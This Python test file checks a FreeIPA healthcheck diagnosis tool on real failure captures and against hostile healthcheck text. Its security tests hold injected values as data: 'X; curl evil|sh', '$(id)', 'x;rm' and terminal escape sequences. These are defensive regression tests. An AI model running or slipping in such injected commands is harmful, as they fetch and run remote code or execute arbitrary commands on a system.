"""An ipa-healthcheck ERROR/CRITICAL finding must never vanish (live-discovered).

Fixture: REAL LIVE CAPTURE - ipa-healthcheck --failures-only from a real
FreeIPA 4.13.3 server with dirsrv stopped. Before the fix ipa-diagnose dropped
`dirsrv: not running` and the CRITICAL follow-on and headlined a CS.cfg
permission warning as the PRIMARY problem."""

from __future__ import annotations

import pathlib

from ipa_diagnose.engine.model import DiagnosisStatus, OverallStatus, PriorityBucket
from ipa_diagnose.engine.run import run_diagnosis
from ipa_diagnose.evidence.collect import collect_evidence

FIXTURE = pathlib.Path(__file__).parent.parent / "fixtures" / "real-freeipa-capture" / "dirsrv-stopped"


def _report():
    return run_diagnosis(collect_evidence(replay_dir=str(FIXTURE)))


def test_stopped_directory_server_is_reported_not_dropped():
    report = _report()
    titles = [d.title for d in report.diagnoses]
    assert any("'dirsrv' is not running" in t for t in titles), titles


def test_stopped_service_is_the_primary_problem_and_status_is_critical():
    report = _report()
    primary = report.by_priority(PriorityBucket.PRIMARY)[0]
    assert "dirsrv" in primary.title
    assert primary.status == DiagnosisStatus.DIAGNOSED
    assert report.overall_status == OverallStatus.CRITICAL


def test_service_finding_does_not_claim_a_root_cause():
    d = next(d for d in _report().diagnoses if "dirsrv" in d.title)
    assert "NOT determined" in d.why
    assert all(a.command is None or "restart" not in a.command and "start " not in a.command.split(";")[0] for a in d.actions)


def test_unexplained_critical_followon_is_shown_as_unknown_never_a_guessed_cause():
    report = _report()
    unknown = [d for d in report.diagnoses if d.rule_id == "healthcheck-check-failed"]
    assert len(unknown) == 1
    assert unknown[0].status == DiagnosisStatus.UNKNOWN_INSUFFICIENT_EVIDENCE
    assert "IPAauthzdatapacCheck" in unknown[0].why
    assert unknown[0].next_diagnostic_step


def test_claimed_findings_are_not_duplicated(tmp_path):
    """A finding already used as evidence by a real rule is not re-reported."""
    from ipa_diagnose.engine import unexplained

    bundle = collect_evidence(replay_dir=str(FIXTURE))
    first = unexplained.unexplained_finding_diagnoses(bundle, [])
    claimed_ids = {r.evidence_id for d in first for r in d.evidence_for}
    assert claimed_ids
    assert unexplained.unexplained_finding_diagnoses(bundle, first) == []


# ---- security-review regressions (untrusted ipa-healthcheck text) ----------

import io
import json as _json

from rich.console import Console

from ipa_diagnose.engine.model import Confidence  # noqa: F401  (import side-effect free)
from ipa_diagnose.evidence.healthcheck import parse_healthcheck_results
from ipa_diagnose.evidence.model import EvidenceBundle
from ipa_diagnose.privacy.minimize import build_ai_payload
from ipa_diagnose.render.console import render_report


def _bundle_from(entries):
    findings = parse_healthcheck_results(entries, command="test", live=False)
    return EvidenceBundle(hostname="h", collected_at=EvidenceBundle.now(), findings=findings)


def _entry(source, check, result, msg):
    return {"source": source, "check": check, "result": result, "uuid": "u", "kw": {"msg": msg}}


def _render(report):
    buf = io.StringIO()
    render_report(report, Console(file=buf, width=120, force_terminal=False, highlight=False), details=True)
    return buf.getvalue()


def test_hostile_finding_text_cannot_crash_render_or_inject_terminal_escapes():
    hostile = "\x1b]0;pwn\x07\x1b[2J [/nonsense] [link=http://evil]click[/link] ‮ boom"
    report = run_diagnosis(_bundle_from([_entry("ipahealthcheck.future.x", "Chk", "CRITICAL", hostile)]))
    out = _render(report)  # must not raise rich.errors.MarkupError
    assert "\x1b" not in out and "‮" not in out
    assert "boom" in out


def test_hostile_check_or_source_never_reaches_the_displayed_command():
    report = run_diagnosis(_bundle_from([_entry("ipahealthcheck.x", "X; curl evil|sh", "ERROR", "boom")]))
    d = next(d for d in report.diagnoses if d.rule_id == "unexplained-findings")
    assert d.next_diagnostic_step == "ipa-healthcheck --failures-only"
    assert all("curl" not in (a.command or "") and ";" not in (a.command or "") for a in d.actions)


def test_hostile_service_name_is_not_treated_as_a_service_and_never_reaches_a_command():
    for bad in ("-H: not running", "a b: not running", "x;rm: not running", "$(id): not running"):
        report = run_diagnosis(_bundle_from([_entry("ipahealthcheck.meta.services", "svc", "ERROR", bad)]))
        for d in report.diagnoses:
            for a in d.actions:
                assert "rm" not in (a.command or "").split() and "$(" not in (a.command or "")
        assert not any(d.rule_id.startswith("service-not-running") for d in report.diagnoses), bad


def test_service_command_is_read_only_and_uses_option_terminator():
    report = run_diagnosis(_bundle_from([_entry("ipahealthcheck.meta.services", "dirsrv", "ERROR", "dirsrv: not running")]))
    cmd = next(d for d in report.diagnoses if "dirsrv" in d.title).actions[0].command
    assert cmd == "ipactl status"  # FreeIPA-managed service: portable, read-only
    report = run_diagnosis(_bundle_from([_entry("ipahealthcheck.meta.services", "certmonger", "ERROR", "certmonger: not running")]))
    cmd2 = next(d for d in report.diagnoses if "certmonger" in d.title).actions[0].command
    assert "-- certmonger" in cmd2 and "restart" not in cmd2 and "start " not in cmd2.split(";")[0]


def test_ai_payload_redacts_secrets_embedded_in_diagnosis_text():
    secret = "sk-abcdefghijklmnopqrstuvwx"
    bundle = _bundle_from([_entry("ipahealthcheck.future.x", "Chk", "CRITICAL", f"token {secret} leaked")])
    report = run_diagnosis(bundle)
    d = next(d for d in report.diagnoses if d.rule_id == "unexplained-findings")
    payload = build_ai_payload(bundle, d)
    assert secret not in payload.user_prompt
    assert payload.redaction_matches


# ---- live-discovered false diagnosis: a crashed check must never read as a finding ------

CERTMONGER_STOPPED = FIXTURE.parent / "certmonger-stopped"


def test_certmonger_stopped_is_not_misdiagnosed_as_an_expired_certificate():
    """REAL LIVE CAPTURE (FreeIPA 4.13.3, certmonger stopped+masked): the cert expiration checks
    CRASH with 'Failed to start certmonger'. Before the fix the Certificates pack turned that into
    a HIGH-confidence PRIMARY 'Tracked certificate has passed its expiration threshold'."""
    report = run_diagnosis(collect_evidence(replay_dir=str(CERTMONGER_STOPPED)))
    titles = [d.title for d in report.diagnoses]
    assert not any("expiration threshold" in t or "expired" in t.lower() for t in titles), titles
    assert any("'certmonger' is not running" in t for t in titles), titles
    primary = report.by_priority(PriorityBucket.PRIMARY)[0]
    assert "certmonger" in primary.title
    assert any(d.rule_id == "healthcheck-check-failed" for d in report.diagnoses)


def test_crashed_check_findings_never_reach_diagnostic_rules():
    from ipa_diagnose.engine import unexplained

    bundle = collect_evidence(replay_dir=str(CERTMONGER_STOPPED))
    crashed = [f for f in bundle.findings if unexplained.is_check_crash(f)]
    assert crashed
    report = run_diagnosis(bundle)
    cited = {r.evidence_id for d in report.diagnoses if d.pack_id != "healthcheck" for r in d.evidence_for}
    assert not cited & {f.finding_id for f in crashed}
